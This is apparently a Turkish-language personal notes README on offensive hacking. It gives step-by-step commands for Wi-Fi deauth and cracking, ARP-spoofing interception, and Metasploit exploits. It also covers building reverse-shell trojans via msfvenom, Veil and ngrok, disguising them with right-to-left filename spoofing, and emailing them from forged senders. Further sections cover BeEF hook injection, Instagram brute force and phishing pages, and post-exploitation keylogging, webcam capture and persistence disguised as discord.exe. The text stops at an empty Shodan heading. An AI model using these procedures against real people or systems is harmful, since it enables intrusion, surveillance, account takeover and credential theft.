# Cyber Security
- [1-VPN DNS MAC](#1-VPN-DNS-MAC)
  - [VPN Book](#VPN-Book)
  - [Kali DNS Ayarları Değiştirme](#Kali-DNS-Ayarları-Değiştirme)
  - [DNS Sızıntı Testi](#DNS-Sızıntı-Testi)
  - [MAC Adresi Değiştirme](#MAC-Adresi-Değiştirme)
- [2-Monitör Mod ve Manage Mod](#2-Monitör-Mod-ve-Manage-Mod)
- [3-Çevredeki Modemleri Bulma](#3-Çevredeki-Modemleri-Bulma)
- [4-Deauth Saldırısı Yapma](#4-Deauth-Saldırısı-Yapma)
  - [Ağdaki Cihazların MAC Adreslerini Görme](#Ağdaki-Cihazların-MAC-Adreslerini-Görme)
  - [Ağdaki Cihazlara Deauth Saldırısı Yapma](#Ağdaki-Cihazlara-Deauth-Saldırısı-Yapma)
    - [Ağdaki Bütün Cihazlara Saldırı](#Ağdaki-Bütün-Cihazlara-Saldırı)
    - [Ağdaki Belirli Cihaza Saldırı](#Ağdaki-Belirli-Cihaza-Saldırı)
- [5-Wifi Parola Kırma](#5-Wifi-Parola-Kırma)
  - [WEB Parola Kırma](#WEB-Parola-Kırma)
  - [VPA ve VPA2 Parola Kırma](#VPA-ve-VPA2-Parola-Kırma)
    - [Handshake Yakalama](#Handshake-Yakalama)
    - [Wordlist Oluşturma](#Wordlist-Oluşturma)
    - [Parola Kırma](#Parola-Kırma)
    - [Brute Force Nedir](#Brute-Force-Nedir)
- [6-IP ve MAC Adreslerini Eşleme](#IP-ve-MAC-Adreslerini-Eşleme)
  - [Netdiscover](#Netdiscover)
  - [nmap](#nmap)
- [7-Man in the Middle Saldırısı](#7-Man-in-the-Middle-Saldırısı)
  - [Arpspoof](#Arpspoof)
  - [Wireshark ile MITM Saldırısı İzleme](#Wireshark-ile-MITM-Saldırısı-İzleme)
  - [Bettercap](#Bettercap)
    - [Bettercap ile Dinleme Yapma](#Bettercap-ile-Dinleme-Yapma)
  - [HTST](#HTST)
  - [HTTPS to HTTP](#HTTPS-to-HTTP)
  - [Windows Bilgisayarımıza MITM Saldırısı Var Mı](#Windows-Bilgisayarımıza-MITM-Saldırısı-Var-Mı)
- [8-NMAP](#NMAP)
  - [NMAP ile Açık Arama](#NMAP-ile-Açık-Arama)
    - [NMAP Komutları](#NMAP-Komutları)
  - [FTP](#FTP)
    - [msfconsole ile Açığa Giriş](#msfconsole-ile-Açığa-Giriş)
    - [Giriş Yaptıktan Sonra](#Giriş-Yaptıktan-Sonra)
  - [TELNET](#TELNET)
  - [SSH](#SSH)
  - [SAMBA](#SAMBA)
  - [POSTGRESQL METERPRETER](#POSTGRESQL-METERPRETER)
- [9-Trojan Backdoor Oluşturma](#9-Trojan-Backdoor-Oluşturma)
  - [Veil](#Veil)
  - [Multihandler Backdoor Dinleme](#Multihandler-Backdoor-Dinleme)
  - [Fatrat](#Fatrat)
    - [Dinlemek içim](#Dinlemek-İçin)
  - [Msfvenom](#Msfvenom)
  - [Ngrok](#Ngrok)
    - [Kendi IP Adresimizi Kullanmadan Trojan Oluşturma](#Kendi-IP-Adresimizi-Kullanmadan-Trojan-Oluşturma)
    - [Hata](#Hata)
  - [Trojan ile Görsel Birleştirme](#Trojan-ile-Görsel-Birleştirme)
    - [Trojanin Uzantısını Değiştirme](#Trojanin-Uzantısını-Değiştirme)
  - [Trojani Fake E-mail ile Yollama](#Trojani-Fake-E-mail-ile-Yollama)
    - [Terminal Üzerinden Fake E-Mail Yollama](#Terminal-Üzerinden-Fake-E-Mail-Yollama)
- [10-Sosyal Mühendislik](#Sosyal-Mühendislik)
  - [Maltego](#Maltego)
- [11-Beef](#Beef)
  - [JS Kodu Enjeksiyonu ve Sürekli İzleme](#JS-Kodu-Enjeksiyonu-ve-Sürekli-İzleme)
- [12-Instagram Hackleme](#Instagram-Hackleme)
  - [Brute Force](#Brute-Force)
  - [Oltalama Phishing](#Oltalama-Phishing)
- [13-Ubuntu ile Websitesi Oluşturma](#Ubuntu-ile-Websitesi-Oluşturma)
- [14-NoIP](#NoIP)
- [15-Hookdan Korunmak İçin](#15-Hookdan-Korunmak-İçin)
  - [Var ise](#Var-ise)
- [16-Setoolkit](#Setoolkit)
  - [Social Engineering Attack](#Social-Engineering-Attack)
  - [Website Attack Vectors](#Website-Attack-Vectors)
  - [Credential Harvester Attack Method](#Credential-Harvester-Attack-Method)
  - [Web Templates](#Web-Templates)
- [17-Hackledikten Sonra](#17-Hackledikten-Sonra)
  - [Hedef PCye Sızdıktan Sonra Kullanılabilecek Komutlar](#Hedef-PCye-Sızdıktan-Sonra-Kullanılabilecek-Komutlar)
  - [Hedef PCyi Hackledikten Sonra Bağlantıyı Sürdürebilir Hale Getirmek](#Hedef-PCyi-Hackledikten-Sonra-Bağlantıyı-Sürdürebilir-Hale-Getirmek)
- [18-Shodan](#18-Shodan)
  - [Shodan İçerisinde Filtreleme](#Shodan-İçerisinde-Filtreleme)
  - [Shodan'ı Terminal Üzerinden Çalıştırmak](#Shodanı-Terminal-Üzerinden-Çalıştırmak)
- [19-Bilgi Toplama](#19-Bilgi-Toplama)
  - [Maltego](#Maltego)
  - [Netcraft](#Netcraft)
  - [Yougetsignal](#Yougetsignal)
  - [Archive](#Archive)
  - [Whoislookup](#Whoislookup)
  - [Robots.txt](#Robots.txt)
  - [Subbrute](#Subbrute)
- [20-Web Pentesting](#20-Web-Pentesting)
  - [DVWA](#DVWA)
  - [NATCAT ile Dinleme](#NATCAT-ile-Dinleme)
  - [Weevely](#Weevely)
  - [File Inclusion](#File-Inclusion)
  - [Nikto](#Nikto)
- [XSS Açıkları](#XSS-Açıkları)
  - [XSS](#Xss)
  - [XSS Reflected](#XSS-Reflected)
  - [XSS Stored](#XSS-Stored)
    - [XSS Stored ve Beef Çalıştırma](#XSS-Stored-ve-Beef-Çalıştırma)
  - [XSSden Korunmak İçin](#XSSden-Korunmak-İçin)
  
# 1-VPN DNS MAC 

VPN (Virtual Personal Network)

DNS (Domain Name Server)

```iwconfig``` -> bağlı olduğumuz wifi ile ilgili bilgileri detaylı olarak gösterir

### VPN Book

```wwww.vpnbook.com``` kali içine VPN indirmemizi sağlar

```openvpn vpnadı``` -> vpn dosyasını açar

```service network-manager restart``` -> internet sunucularını resetler

### Kali DNS Ayarları Değiştirme

```nano /etc/dhcp/dhclient.conf``` içindeki ```prepentt name servers ```değiştirmemiz gerekir

Google DNS-> 8.8.8.8 ya da 8.4.4.8
Cloudflare -> 1.1.1.1. ya da 1.0.0.1

### DNS Sızıntı Testi 

www..dnsleaktest.com

### MAC Adresi Değiştirme

> ### 1.Yöntem

```macchanger```ile mac adresimizi değiştirebiliriz ya da

> ### 2.Yöntem
```
ifconfig wlan0 down

ifconfig wlan hw ether XX:XX:XX:XX:XX:XX  İstediğimiz MAC adresini yapmamızı sağlar

ifconfig wlan0 up
```

# 2-Monitör Mod ve Manage Mod

Wifi adaptörümüzü bilgisayarımıza bağlıyoruz, daha sonra kalimizi monitör moda almamız gerekiyor

> ### 1.Yöntem

```airmon -ng start wlan0```-> interneti monitör moda alır !! Monitör modda iken internete bağlanamayız sadece bağlı olmadığımız ağların bilgilerini elde edebiliriz

```airmon -ng stop wlan0``` -> interneti manage moda alır 

> ### 2.Yöntem
```
ifconfig wlan0 down

ifconfig wlan0 mode monitor

ifconfig wlan0 up
```

# 3-Çevredeki Modemleri Bulma

```airopdump -ng wlan0mon``` -> Çevredeki Modemleri Bulur

```CTRL + X ile işlemi sonlandırırız```

```
* pwr -> - Olarak ne kadar büyükse modem bize o kadar yakındır
* Data -> O ağa kaç cihazın bağlı olduğunu gösterir
* CH -> Hangi kanalda olduğunu gösterir
* ENC -> Şifreleme işlemi bilgisi
```

# 4-Deauth Saldırısı Yapma

### Ağdaki Cihazların MAC Adreslerini Görme
```
airodump -ng --channel X (kanal numarası) --bssid XX:XX:XX:XX:XX:XX (MAC adresi) --write airodumptest (Sonuçları yazdıracağımız 
dosya adı) wlan0
```
### Ağdaki Cihazlara Deauth Saldırısı Yapma

> ### Ağdaki Bütün Cihazlara Saldırı
```
aireplay -ng --deauth A -a XX:XX:XX:XX:XX:XX wlan0mon
```

> ### Ağdaki Belirli Cihaza Saldırı
```
aireplay -ng --deauth A -a XX:XX:XX:XX:XX:XX -c YY:YY:YY:YY:YY:YY wlan0mon
```

```
* A: Gönderilecek paket sayısı, sayı büyüdükçe ağda düşme süresi artar
* -a:  Ağın MAC adresi
* -c:  Saldırı Yapılacak Cihazın MAC adresi
```

# 5-Wifi Parola Kırma 

### WEB Parola Kırma 

Fakeauth saldırısı yapıyoruz ağdan birisi düşüp tekrar bağlanırsa handshake yakalamamız kolaylaşır

```aireplay -ng --fakeauth 0 -a XX:XX:XX:XX:XX:XX -h YY:YY:YY:YY:YY:YY wlan0mon```

```aireplay -ng --arpreplay -b XX:XX:XX:XX:XX:xX -h YY:YY:YY:YY:YY:YY wlan0mon``` belirlenen cihaza IV yollamamızı sağlar

Eğer Ağda Yeteri Kadar Cihaz Yoksa
* fakeauuth yolla
* arpreplay çalıştır
* aircrack -ng çalıştır

```aircrack -ng airodumptest.cap (Tarama Sırasında Yazdırdığımız Dosya)``` 

```192.168.1.1 modeminizin ara yüzüne giriş yaparsınız```

### VPA ve VPA2 Parola Kırma

www.gpuhash.me  -> içine yakalanan handshake'i atarak online olarak şifre kırma işlemi uygulanabilir

### Handshake Yakalama

``` airodump -ng --channel X --bssid XX:XX:XX:XX:XX:XX --write handshake-file wlan0mon```

```
channel: Ağın çalıştığı kanal
bssid: Ağın MAC adresi
write: Yakalanan handshake'in nereye kayıt edileceği
```

**! Kolayca handshake yakalamak için ufak paketli deauth saldırı yapılabilir**

### Wordlist Oluşturma

``` crunch 6 10 0123456789abcdefgh -o passwrd.txt``` 
içinde "0123456789abcdefgh" geçen min 6 maks 10 haneli şifre kombinasyonlarının olduğu passwrd isimli wordlist oluşturur

```filesystem/usr/shake/wordlist``` içinde en çok kullanılan şifrelerin bulunduğu wordlist

```cat wordlist.txt``` wordlistin içindeki şifreleri görmemizi sağlar

### Parola Kırma

``` aircrack -ng handshake-file.cap -w passwrd.txt``` handshake dosyasını ve worlisti kullanarak brute froce saldırısı yapar

> ### Brute Force Nedir

Brute Force mümkün olan bütün şifre kombinasyonlarını denemektir. Bu yöntemi kullanarak şifreyi kesin buluruz fakat bu işlem saatlerce, günlerce, aylarca, hatta yılllarca sürebilir

![image](https://user-images.githubusercontent.com/85068070/216357440-ba01b31d-76d1-4f35-b7ba-47da04ead32f.png)

# 6-IP ve MAC Adreslerini Eşleme

### Netdiscover

```netdiscover -i eth0 -r XX:XX:XX/24 -c 10``` 

* -r: eth0'daki inet'in ilk 6 hanesi
* -c: deneme sayısı

### nmap

``` nmap XX:XX.XX.0/24 ```  0 ve 24 yani tüm aralıktaki IPlere istek atar, IP ve MAC adreslerini eşleştirip ekstra bilgi verir. Atılan istekleri
karşı taraf görebilir

# 7-Man in the Middle Saldırısı

### Arpspoof

İlk olarak **arpspoof**'u indirmemiz gerekiyor onun için; ```apt install dsniff```

```arpspoof -i eth0 -t XX:XX:XX:XX YY:YY:YY:YY```  target'a kendimizi modem olarak tanıtıyoruz
```
-t: Kurban IP

YY:YY:YY:YY : Kendi IP adresimiz 
```
Daha sonra ```arpspoof -i eth0 -t YY:YY:YY:YY XX:XX:XX:XX``` yazarak modem'e kendimizi target olarak tanıtıyoruz
```
-t: Kendi IP'miz
XX:XX:XX:XX : Kurban IP
```
``` echo 1 > /proc/sys/net/ipv4/ip-forward``` IP forwardlamayı etkinleştirerek **hedef pc'nin** ağdan kopmamasını sağlıyoruz

### Wireshark ile MITM Saldırısı İzleme

Wireshark kullanarak ağ izleme yapılabilir ve ARP isteği var mı incelenebilir eğer işlemlerin yanında **duplicate use of..** yazıyorsa MITM saldırısı vardır. **http** olan websitesi içine girilen bilgiler (e.g. Login bilgileri) Wireshark içinden incelenerek görülebilir. **https** olan websitelerinde bu bilgiler şifreli olarak taşındığı için açık şekilde okunamaz

  ![wireshark görsel](https://github.com/ahmetnuysal/Cyber-Security/blob/6880076de41a97a03edb4fe36e75dfce1e58ac9a/MITM/WhatsApp%20Image%202022-08-16%20at%2019.17.24.jpeg)

### Bettercap 

* Terminal'e ```bettercap -iface eth0``` yazarak bettercap'i açıyoruz
* bettercap çalıştırdıktan sonra ```help``` yazarsak içinde nelerin çalıştığını görebiliriz

* ```net.prope on``` Ağdaki cihazların IP adresini, MAC adreslerini ve cihaz isimlerini gösterir
* ```net.show``` Toplanan bilgileri özet olarak gösterir


Bettercap İçinde

* ```arp.ban on``` hedef PC'ye deauth saldırısı yapar
* ```arp.spoof.fullduplex``` Hem modeme hem PC'ye MITM saldırısı yapar
* ```arp.spoof.internal``` True olursa, PC'ler arasındaki bağlantıları gösterir
* ```arp.spoof.skip_restore``` True olursa, Saldırı sonrası doğru verileri göndermez
* ```arp.spoof.targets 192.168.123.123``` "," koyarak birden fazla PC'ye MITM saldırısı yapabiliriz
* ```arp.spoof.whitelist``` Belirtilen IP adreslerine sahip cihazlara saldırı yapmaz

Parametreleri değiştirmek için: ```set``` komutunu kullanıyoruz. ```(e.g. arp.spoof.fullduplex true)``` 

> ### Bettercap ile Dinleme Yapma

* ```net.sniff on``` Hedef PC'yi dinlemeye başlar

### HTST

```htst``` ne olursa olsun o siteyi https olarak açmaya zorluyor

### HTTPS to HTTP

```hstshijack.cap``` dosyasında ```com``` uzantıları ```corn``` olarak değiştiriyoruz

> ### Windows Bilgisayarımıza MITM Saldırısı Var Mı 

Windows arama yerine ```cmd``` yazarak terminali açıyoruz ve ```arp -a``` yazarak modem ile aynı MAC adresine sahip birisi var mı görüyoruz

# 8- NMAP

### NMAP ile Açık Arama

```nmap -v -sS -A -T4 XX:XX:XX:XX:XX (Target IP)```  Taranan adresteki açıkları gösterir

> ### NMAP Komutları
```
-A: Farklı işletim sistemi versiyon vs verir.
-sn: Port taraması yapma anlamına gelir.
-n: DNS Çözümlemesi yapma anlamına gelir.
-v, -vv, -vvv: Ekrana gösterilecek detayları arttırır.
-F: Daha hızlı tarama yapar. Daha az sonuç bulur.
-sS:Syn Taraması Yapar
--reason: Bulduğu bir sonucun sebebini gösterir.
--open: Sadece açık Portları gösterir.
-p-: Bir IP üzerinde bulunması muhteme 65535 portun hepsini tarar.
-sV: Açık portta çalışan servisin ne olduğunu bulmaya çalışır.
-sC ile birlikte kullanılırsa işe yarar.
-sC: -sV ile versiyon tespiti yapılırken nmap scriptlerini kullanır.
-p: Sadece bu parametreden sonra belirtilen portları tarar.
-o: İşletim sistemi bilgilerini gösterir.
```
### FTP

```ftp 192.168.123.123``` çalıştırıyoruz, kullanıcı adı ve şifre yerine "anonymous" yazıyoruz. ftp açığına bağlandıktan sonra ```put dosyaadı``` ile dosya ekleyebiliriz. Google'a nmap'te bulunan ```vsftpd A.B.C (vsftpd 2.3.4) exploit``` yazarak gerekli komutlara ulaşabiliriz

> ### msfconsole ile Açığa Giriş

1. ```msfconsole``` çalıştırıyoruz
2. ```msf > use exploit/unix/ftp/usftp_234_backdoor```
3. ```show targets```
4. ```set targets 192.168.123.123``` hedef IP
5. ```show options```
6. ```set RHOST 192.168.123.123``` hedef IP
7. ```set RPORT 21``` port'u değiştiriyoruz
8. ```exploit -j -z``` dinleyeme başlıyoruz (```-j -z``` dersek dinlemeyi arka planda yapar)
9. ```sessions -l``` açık olan portları görürüz
10. ```session 1``` 1. session açık olduğu için o porttan giriş yapar

> ### Giriş Yaptıktan Sonra

1. ```uname -a``` içinde olduğumuz sistemin adını verir
2. ```ls, pwd``` gibi komutlarla sistemde gezinebiliriz
3. ```background``` ile sistemden çıkış yaparız

### TELNET

Telnet SSH'dan daha güvensizdir. ```telnet 192.168.123.123``` çalıştırarak giriş yapıp ```wireshark``` üzerinden şifre ve kullanıcı adını rahatça görebiliriz

### SSH

```sshmsfadmin@192.168.123.123``` çalıştırarak giriş yapıp ```wireshark``` üzerinden şifre ve kullanıcı adını **şifrelenmiş** olarak görürüz

### SAMBA

Samba linux sunucuları ile windows sunucularını birbirine bağlar. Şirketlerdeki PC, yazıcı vb şeyleri birbirine bağlar

1. Samba Numarasını ```(samba smbd 3.x-4.x) exploit``` ile google'da ararız
2. ```msfconsole``` açarız
3. Google üzerinde çıkan komutları yazıyoruz
4. ```LHOST``` bizim IP adresimiz
5. ```exploit -j -z``` dinleyeme başlıyoruz ```-j -z``` dersek dinlemeyi arka planda yapar
6. ```sessions -l``` açık olan portları görürüz
7. ```session 1``` 1. session açık olduğu için o porttan giriş yapar


### POSTGRESQL METERPRETER

1. Postgresql kodunu google'da exploit olarak aratıyoruz
2. ```msfconsole``` açıyoruz
3. Google üzerinden çıkan kodları çalıştırıyoruz
4. ```show options``` çalıştırdığımızda çıkan bilgiler içinde default password'u görürüz
5. ```LHOST``` ve ```RHOST``` ayarlarını değiştriiyoruz
6. ```exploit -j -z``` dinleyeme başlıyoruz ```-j -z``` dersek dinlemeyi arka planda yapar
7. ```sessions -l``` açık olan portları görürüz
8  ```session 1``` 1. session açık olduğu için o porttan giriş yapar

# 9- Trojan Backdoor Oluşturma

### Veil

1. Veil opt içinde kurulu olduğu için ```/opt``` içine giriyoruz
2. ```python3 veil.py``` 
3. ```>>use 1``` 
4. ```>>list``` diyerek farklı dillerde ve amaçlarda backdoor seçeneklerini listeleriz
5. ```LPORT, LHOST, sleep, processors``` gibi ayarları değiştirip ```generate``` diyerek trojanı oluşturmaya başlarız
6. Oluşturulan trojan'ın konumunu görürüz (var/lib/veil/output/complied) 
7. Oluşturduğumuz trojan'ı ```antiscan.me``` gibi sitelerde test edebiliriz

### Multihandler Backdoor Dinleme

1. ```msfconsole``` 
2. ```use exploit/multi/handler``` diyerek payload tanımlıyoruz
3. ```set patload windows/meterpreter/reverse_http```  (trojanın oluşturulma tipine göre değişiklik gösterebilir)
4. ```LHOST ve LPORT```'u değiştiriyoruz
5. ```exploit -j -z``` ile dinlemeye başlıyoruz 
6. Trojan çalıştığında ```sessions -l``` ve ```session 1``` ile backdoor'dan giriş yapıyoruz

```service apache2 start/stop``` Kendi IP'mizin Web servisini aktif hale getirir

### Fatrat

1. ```fatrat``` ile framework'ü açıyoruz
2. Yapmak istediğimiz işleme göre seçim yapıyoruz trojan oluşturmak için ```[02] Create Fud Backdoor with Fudwin 1.0``` seçiyoruz
3. Trojanı yapıcağımız tool'u seçiyoruz ```[1] Hızlı [2] Yavaş fakat diğerine göre daha güçlü```
4. ```LHOST, LPORT``` giriyoruz
5. Trojan adını seçiyoruz
6. ```32bit/64bit``` seçiyoruz
7. Trojan'ı oluşturuyoruz ve dinliyoruz

> ### Dinlemek için

1. ```msfconsole``` 
2. ```use exploit/multi/handler``` diyerek payload tanımlıyoruz
3. ```set patload windows/meterpreter/reverse_tcp```  (trojanın oluşturulma tipine göre değişiklik gösterebilir) 
4. ```LHOST ve LPORT```'u değiştiriyoruz
5. ```exploit -j -z``` ile dinlemeye başlıyoruz 
6. Trojan çalıştığında ```sessions -l``` ve ```session 1``` ile backdoor'dan giriş yapıyoruz

### Msfvenom

```msfvenom -p windows/meterpreter/reverse_tcp -a X86 --platform windows lhost=0.tcp... lport=12345 -f exe -o /root/newbackdoor.exe```
```
-p: payload
-a: bit sayısı
--platform: hangi platformda çalışacağı 
lhost: ngrok'dan kopyaladığımız IP
lport: ngrok'dan kopyaladığımız PORT
-f: dosya uzantısı 
-o: trojan'in kaydedileceği konum
```

### Ngrok

> ### Kendi IP Adresimizi Kullanmadan Trojan Oluşturma

1. ```ngrok.com``` sitesine gidiyoruz, üye oluyoruz ve profilimizde bize ait olan token'ı kopyalıyoruz
2. Terminale giriyoruz ve ```.ngrok config add-authtoken 2BA7...Xoh``` çalıştırıyoruz 
3. ```./ngrok``` çalıştırarak ngrok'u açıyoruz ```./ngrok help``` ile menüyü açabiliriz
4. ```./ngrok tcp 4242``` çalıştırarak 4242 portunda tünel servisini açıyoruz
5. ```forwarding``` kısmındaki ```IP``` ve ```PORT```'u kaydediyoruz

> ### Hata 

```/opt/veil/tools/evasion/tool.py``` içindeki kodda ```!Error!You did not provide a valid IP``` kodunu siliyoruz(421-424.satır)
```selected_payload__ ``` kısmını if ile alt alta getirip ```if helpes validate_ip(value)``` kodunu siliyoruz

Ngrok kullanarak trojan oluştururken (veil ya da msfvenom) ```LHOST``` yerine 0.tcp.eu.ngrok ```LPORT``` yerine (ngrok içindeki port) 17716 (değişebilir) yazıyoruz

### Trojan ile Görsel Birleştirme

1. İlk olarak görselimizi (.jpeg) seçip google üzerinden uzantısını ```.ico```'ya çeviriyoruz 
2. ```Veil``` kullanarak trojan'i oluşturuyoruz
3. İndirdiğimiz ```.ico``` uzantılı görsel ile trojan'i aynı dosya içine atıyoruz
4. Dosya içine girip ```python3 trojan_factory.py -f http://192.168.123.456/backdoors/andorid.jpeg -e http://192.168.123.456/backdoors/mynewpayload.exe -o /opt/trojanfactory/newtest.exe ; http://192.168.123.456/backdoors/android.ico``` çalıştırıyoruz
```
-f: .jpeg dosyasının konumu
-e: trojan'in konumu
-o: .ico'nun konumu 
```

> ###  Trojanin Uzantısını Değiştirme

1. ```apt-get install gnome-characters``` karakter paketini indiriyoruz
2. İndirdiğimiz framework'ü açıyoruz ve arama yerine ```right-to-right``` yazıp çıkan şeyi kopyalıyoruz
3. ```.exe``` dosyamızın sonunda ```gepj.exe``` yazıyoruz
3. ```gepj.exe``` kısımını seçip ```ctrl+v``` yapıyoruz ve dosya uzantısı ```.jpeg``` olarak gözüküyor

```right-to-left``` characters kısmında yoksa google'a ```unicode-table``` yazıp çıkan siteden kopyalabiliriz ```U+202E```

### Trojani Fake E-mail ile Yollama

Google'a ```send anonymous e-mail``` aratıyoruz. Göndermek istediğimiz trojan'i .zip dosyasına çevirerek mail ile yollayabiliriz

> ### Terminal Üzerinden Fake E-Mail Yollama

```sendemail -f admin@gmail -t hedefmailadresi@gmail.com -s smtp.gmail.com:587 -xu gerçekmailadresi@gmail.com -xp MY-PASSWORD -u test email -m your gmail has been hacked```
```
-f: Mail'i Gönderen Fake E-mail Adresi
-t: Hedef E-mail Adresi
-s: Mail'in Smtp'si (Google Üzerinde Bakılabilir)
-xu: Kendi E-mail Adresimiz
-xp: Kendi E-mail Adresimizin Şifresi
-u: Mail'in Başlığı
-m: Mail'in İçeriği
```

# 10-Sosyal Mühendislik

### Maltego

```maltego``` kali içinde yüklü framework 

![maltego](https://github.com/ahmetnuysal/Cyber-Security/blob/b68de2a49b710eb320f11e01a9013021663d0dc3/WhatsApp%20Image%202022-08-17%20at%2016.29.29.jpeg)

Yeni Sayfa Açmak 

![maltego yeni sayfa](https://github.com/ahmetnuysal/Cyber-Security/blob/b68de2a49b710eb320f11e01a9013021663d0dc3/WhatsApp%20Image%202022-08-17%20at%2016.28.13.jpeg) 

Sol Taraftan Ne Tür Arama Yapıcağımızı Seçiyoruz

![sosyal mühendislik](https://github.com/ahmetnuysal/Cyber-Security/blob/75e15440d30a5e6fd7a7910cafc44beec6b2496c/WhatsApp%20Image%202022-08-17%20at%2016.34.43.jpeg)

Sağ Click Yaparak Hangi Tür Bilgileri Edinebileceğimizi Görebiliriz Ya Da Tüm Bilgileri Görebiliriz

![run](https://github.com/ahmetnuysal/Cyber-Security/blob/9b17f8f1f08083fe3766213e94b20e62b1fa1aff/WhatsApp%20Image%202022-08-17%20at%2016.38.10.jpeg)

Ve toplanan bilgileri görürüz  

# Beef

Beef Hedef PC'nin arama motorunda JS kodu çalıştırır

1. ```beef-xss``` beef'i açıyoruz
2. Beef'in sitesine üye olmamız gerekiyor
3. ```/var/www/html``` içerisinde ki ```inde.html``` açıyoruz
4. İçerisine ```<script src="http://192.168.123.456:3000/hook.js"></script>``` yazıyoruz ```JS kodu içindeki IP Kalimizin IP'si olmalı```
5. Artık bizim apache service'imize giren PC'leri Beef üzerinden görebiliriz

### JS Kodu Enjeksiyonu ve Sürekli İzleme
```usr/share/bettercap/caplets/beefcustom``` içerisindeki ```.js``` ve ```.cap``` dosyalarındaki kodları değiştiriyoruz

js içine kendi Kali IP'mizi yazıyoruz

![](https://github.com/ahmetnuysal/Cyber-Security/blob/7a72a371b14ce345df21530e7a7c3d676869afd1/WhatsApp%20Image%202022-08-28%20at%2011.59.29.jpeg)

.cap içine hedef PC'nin IP'sini yazıyoruz

![](https://github.com/ahmetnuysal/Cyber-Security/blob/7a72a371b14ce345df21530e7a7c3d676869afd1/WhatsApp%20Image%202022-08-28%20at%2012.00.00.jpeg)

Bazı Beef Komutları
```
spydereye: Browser'ın SS'ini alır
create alert dialog: Belirlenen mesajı hedef browser ekranına bastırır
pretty theft: Sosyal medya hesabınızdan çıkış yapıldı bastırıp kullanıcı adı ve şifre ister
fake notificatio bar: Hedefe fake bir güncelleme bildirimi yollayıp dosya indirebiliriz
```

# 12-Instagram Hackleme

### Brute Force

Wordlist oluşturarak instagram vb. siteleri hacklemek için kullanılır

1. İlk olarak ```git clone https://github.com/Pure-LOG1C/Instagram.git``` kuruyoruz
2. ```crunch 7 8 xyz123 -o instawordlist``` ile wordlist oluşturuyoruz
3. ```python instagram.py kullanıcıadı instawordlist 10``` ile wordlist içindeki şifreleri denemeye başlıyoruz 

```kullanıcıadı```: Hedef hesabın kullanıcı adı

### Oltalama Phishing

1. Google'a ```Instagram phishing script 2022``` aratıyoruz
2. ```index.html``` ve ```post.php``` dosyalarını indiriyoruz ve fake instagram giriş sayfası yapıyoruz
3. ```000webhost``` adresinden bedava websitesi alabiliriz
4. İndirdiğimiz dosyaları websitemizin ```public_html``` kısmına yüklüyoruz
5. Arama kısımına ```https://sitemizinadı.000webhost.com/password.html``` yazarak girilen bilgileri görürüz

# 14-NoIP

Ücretsiz olarak hostname almamızı sağlayan sitedir

1.```noip.com``` sitesine giriyoruz
2.```quickadd``` kısmından free hostname ve domain alıyoruz
3.```Dynamic DNS``` girip sitemize tıklıyoruz
4.```IPv4``` yerine sunucumuzun IP adresini giriyoruz

# 15-Hookdan Korunmak İçin

1.Siteye sağ tık yaparak ```incele``` diyoruz 
2.İçerisinde ```hook``` içerikli ```<script>``` kodu var mı diye kontrol ediyoruz

### Var ise

1. Sayfayı Kapatıyoruz
2. PC'yi resetliyoruz
3. İnternet sağlayıcımızı arayarak IP adresimizi değiştiriyoruz

# 16-Setoolkit (Social Engineering Toolkit)

1. ```setoolkit``` tool'u açıyoruz

![](https://github.com/ahmetnuysal/Cyber-Security/blob/88ac00ceec1bd42735948076f806d36ac5d0e89f/WhatsApp%20Image%202022-08-28%20at%2014.53.30.jpeg)

1: Sosyal Mühendislik Atağı
2: Sızma Testi Araçları
3: Setoolkit için yazılmış 3th party uygulamaları çalıştırır

### Social-Engineering Attack

![](https://github.com/ahmetnuysal/Cyber-Security/blob/540f2a7967dbc04796e3df22f4938e7e17290487/WhatsApp%20Image%202022-08-28%20at%2014.56.53.jpeg)

1: Kişiye/Kuruma Özel Sosyal Mühendislik
2: Websitesi Saldırı
3: Zararlı Yazılım Oluşturur
4: Backdoor Oluşturur
5: Mail Yollar
6: Ardunio İçine Trojan
7: Wifi Atak
8: Zararlı QR Kod Oluşturur

### Website Attack Vectors

![](https://github.com/ahmetnuysal/Cyber-Security/blob/7ec00a9a3d469ba29d8feaccfb0d40c1d9ef2d86/WhatsApp%20Image%202022-08-28%20at%2015.02.57.jpeg)

### Credential Harvester Attack Method

![](https://github.com/ahmetnuysal/Cyber-Security/blob/71d6c4090d56fa3eb5d9f81b99c9a645429400da/WhatsApp%20Image%202022-08-28%20at%2015.05.24.jpeg)

1: Hazır Web Templateslar
2: Web Sitesi Klonlama
3: Custom Kendi Html Adresimiz

### Web Templates

6. Bizden yanıtların yollayacağı IP adresini istiyor
7. ```./ngrok http 80``` çalıştırıp http adresine bakıyoruz
8. ```ping XXX.XXX.XXX.XXX``` ngrok steimizin IP adresini öğreniyoruz (XXX.XXX.XXX.XXX: http adresi)
9. Öğrendiğimiz IP adresini ```setoolkit```'e yazıyoruz, arayüz seçip çalıştırıyoruz

# 17-Hackledikten Sonra

1. ```msfconsole```
2. ```use exploit/multi/handler```
3. ```set PAYLOAD windows/meterpreter/reverse_http``` (trojan hhtp uzantıı olduğu için http, tcp uzantılı olsaydı ```reverse_tcp``` olucaktı
4. ```lhost 192.168.123.456``` (Kali IP'miz)
5. ```lport 8080```
6. ```exploit -j -z```
7. ```sessions -l```
8. ```session -1```

### Hedef PC'ye Sızdıktan Sonra Kullanılabilecek Komutlar
```
background: Session'dan Çıkar
sysinfo: Bilgisayarın Temel Bilgilerini Gösterir
webcam_stream: Hedef PC'nin Kamerasını Açar
ps: Hedef PC'de Çalışan Programları ve Program ID'lerini Gösterir
migrate 2824: Trojan'i 2824 (explorer.exe) içine saklar (2824 değişebilir, neyin içine saklamak istiyorsan onun ID'sini yazarız)
upload dosyaadı: Hedef PC'nin İçine Dosya Yüklememizi Sağlar
download dosyaadı: Hedef PC'nin İçindeki Dosyayı Kali'ye İndirir
keyscan_start: Hedef PC'de Basılan Tuşları Kaydetmeye Başlar
keyscan_dump: Hedef PC'de Basılan Tuşları Gösterir
screenshot: Hedef PC'nin Ekran Görüntüsünü Alır
```

# Hedef PC'yi Hackledikten Sonra Bağlantıyı Sürdürebilir Hale Getirmek

1. ```msfconsole```
2. ```use exploit/windows/local/persistence```
3. ```show options```
4. ```delay 10``` Hedef PC Tekrar Açıldıktan Kaç Saniye Sonra Session'un Açılcağını Belirleriz
5. ```exe_name discord.exe```  Hedef PC'nin Servis Listesinde Görünecek İsim (e.g. discord.exe)
6. ```show advanced```
7. ```set exe::custom /var/www/html/backdoors/tcp backdoor.exe``` Trojan'in Bulunduğu Konum
8. ```exploit```

# 18-Shodan 

